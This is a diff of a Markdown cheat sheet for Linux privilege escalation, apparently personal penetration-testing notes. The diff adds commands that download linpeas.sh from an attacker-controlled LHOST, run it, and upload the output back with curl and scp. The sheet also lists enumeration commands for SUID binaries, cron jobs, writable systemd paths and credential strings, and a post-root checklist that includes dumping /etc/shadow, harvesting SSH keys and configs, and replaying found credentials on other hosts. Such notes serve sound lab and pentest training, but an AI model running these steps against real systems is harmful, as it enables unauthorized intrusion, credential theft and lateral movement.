@@ -1,15 +1,43 @@
-# Linux Privilege Escalation
-
 ## Stabilize shell
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo; fg; export TERM=xterm
 ```
 
-## PEASS collection and parsing
-```text
-Use [[Shell Delivery and Transfer]].
+## linPEAS collection and parsing
+
+Primary workflow:
+- download `linpeas.sh` to target
+- run it and save raw output locally
+- upload the raw output back to Kali
+- parse it there if needed
+
+Download and run:
+```bash
+LHOST=<LHOST or already exported>
+mkdir -p /tmp/working
+curl "http://$LHOST/linpeas.sh" -o /tmp/working/linpeas.sh
+chmod +x /tmp/working/linpeas.sh
+bash /tmp/working/linpeas.sh | tee /tmp/working/linpeas.out
+curl -X POST --data-binary @/tmp/working/linpeas.out "http://$LHOST/upload?name=linpeas.out"
 ```
+
+Fallback download:
+```bash
+mkdir -p /tmp/working
+wget "http://$LHOST/linpeas.sh" -O /tmp/working/linpeas.sh
+chmod +x /tmp/working/linpeas.sh
+bash /tmp/working/linpeas.sh | tee /tmp/working/linpeas.out
+```
+
+If the upload endpoint is not reachable:
+```bash
+scp /tmp/working/linpeas.out "kali@$LHOST:/tmp/"
+```
+
+Parsers:
+- [ParsingPeas](https://github.com/YuvalMil/ParsingPeas)
+- [parsePEASS](https://github.com/mnemonic-re/parsePEASS)
 
 ## Show current user and host
 ```bash
@@ -25,57 +53,12 @@ sudo -l
 sudo -l | grep LD_PRELOAD
 ```
 
-## Find SUID, SGID, and capabilities
-```bash
-find / -perm -u=s -type f 2>/dev/null
-find / -perm -g=s -type f 2>/dev/null
-getcap -r / 2>/dev/null
-```
-
-## List cron and timers
-```bash
-ls -lah /etc/cron*
-cat /etc/crontab
-crontab -l
-systemctl list-timers --all
-```
-
-## Show timer and service definitions
-```bash
-systemctl cat <timer>.timer
-systemctl cat <service>.service
-systemctl status <timer>.timer
-systemctl status <service>.service
-```
-
-## Find writable systemd paths
-```bash
-find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null
-```
-
-## Find writable directories
-```bash
-find / -writable -type d 2>/dev/null
-```
-
 ## Show processes and listening ports
 ```bash
 ps aux
 ss -antup
 ip a
 ip route
-```
-
-## Loot triage checklist
-```text
-Pull and review first:
-- .env, config.php, wp-config.php, settings.py, .htpasswd, backup scripts
-- .bak, .zip, .tar, .gz, sqlite, db dump, sql export
-- cron scripts, systemd unit ExecStart targets, writable helper scripts
-- mounted backups, NFS content, app source, deployment leftovers
-- SSH keys, shell histories, MySQL creds, LDAP configs
-
-Every recovered password, key, or connection string gets replayed before you go bug hunting.
 ```
 
 ## Expose a localhost-only service immediately
@@ -109,6 +92,39 @@ find /opt -name "*.conf" 2>/dev/null
 ```bash
 find /var/www /opt /srv -type f \( -name ".env" -o -name "web.config" -o -name "config.php" -o -name "*.ini" -o -name "*.conf" -o -name "*.yml" -o -name "*.yaml" \) 2>/dev/null
 grep -RniE 'DB_|database|username|password|dsn|bindpw' /var/www /opt /srv 2>/dev/null
+```
+
+## List cron and timers
+```bash
+ls -lah /etc/cron*
+cat /etc/crontab
+crontab -l
+systemctl list-timers --all
+```
+
+## Show timer and service definitions
+```bash
+systemctl cat <timer>.timer
+systemctl cat <service>.service
+systemctl status <timer>.timer
+systemctl status <service>.service
+```
+
+## Find writable systemd paths
+```bash
+find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null
+```
+
+## Find writable directories
+```bash
+find / -writable -type d 2>/dev/null
+```
+
+## Find SUID, SGID, and capabilities
+```bash
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
 ```
 
 ## Check local databases with found creds
@@ -153,7 +169,6 @@ chmod +x /tmp/run.sh
 ```
 
 ## Post-exploitation after root
-```text
 Do this before pivoting:
 - dump /etc/shadow
 - review all shell histories
@@ -164,4 +179,3 @@ Do this before pivoting:
 - pull LDAP, MySQL, web app, and backup configs while you still have context
 - check extra NICs, routes, listening ports, /etc/hosts
 - test found creds on SSH, databases, and other hosts
-```
